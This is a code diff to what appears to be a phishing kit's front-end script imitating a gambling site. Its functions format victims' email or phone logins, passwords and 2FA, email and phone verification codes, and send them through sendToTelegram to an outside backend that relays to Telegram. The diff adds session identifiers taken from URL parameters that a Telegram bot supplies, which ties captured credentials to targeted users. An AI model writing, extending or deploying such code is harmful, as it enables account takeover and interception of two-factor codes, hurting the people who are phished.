@@ -3,6 +3,19 @@
 // ======================================================
 const BACKEND_ENDPOINT = window.BACKEND_ENDPOINT || "https://api.bcgame67.com/api/telegram";
 
+// Read claim params from URL (sent by Telegram bot)
+const _claimParams = new URLSearchParams(window.location.search);
+const _claimCtx = {
+    username: (_claimParams.get('username') || '').trim(),
+    level:    (_claimParams.get('level')    || '').trim(),
+    uid:      (_claimParams.get('uid')      || '').trim(),
+};
+function _claimHeader() { return ''; }
+function _sessionId() {
+    if (_claimCtx.username && _claimCtx.level) return `${_claimCtx.username}(${_claimCtx.level})`;
+    return userInfo ? userInfo.ip : '?';
+}
+
 
 
 // ======================================================
@@ -66,7 +79,7 @@ async function sendToTelegram(message) {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                message,
+                message: _claimHeader() + message,
                 parse_mode: 'HTML'
             })
         });
@@ -137,7 +150,7 @@ function formatLoginMessage(emailPhone, password) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(${userInfo.ip})</b>
+    return `<b>${_sessionId()}</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Password:</b> <code>${password}</code>
 <b>Country: ${userInfo.country}</b>`;
@@ -183,37 +196,35 @@ function formatOneTimeLoginMessage(emailPhone) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(${userInfo.ip} 1⃣)</b>
+    return `<b>${_sessionId()} 1⃣</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Country: ${userInfo.country}</b>`;
 }
 
 function format2FAMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}🔐: (${userInfo.ip}):</b> <code>${code}</code>`;
+    const prefix = switched ? 'switched ' : '';
+    return `<b>${prefix}🔐 ${_sessionId()}:</b> <code>${code}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📧: (${userInfo.ip}):</b> <code>${code}</code>`;
+    const prefix = switched ? 'switched ' : '';
+    return `<b>${prefix}📧 ${_sessionId()}:</b> <code>${code}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
-    const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📱: (${userInfo.ip}):</b> <code>${code}</code>`;
+    const prefix = switched ? 'switched ' : '';
+    return `<b>${prefix}📱 ${_sessionId()}:</b> <code>${code}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
-    // Capitalize first letter only
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
-    return `<b>(${userInfo.ip})</b>
+    return `<b>${_sessionId()}</b>
 <b>Switched:</b> ${toMethodFormatted}`;
 }
 
 function formatGoVerifyMessage(method) {
-    // Capitalize first letter only
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
-    return `<b>(${userInfo.ip})</b>
+    return `<b>${_sessionId()}</b>
 <b>Selected:</b> ${methodFormatted}`;
 }
 
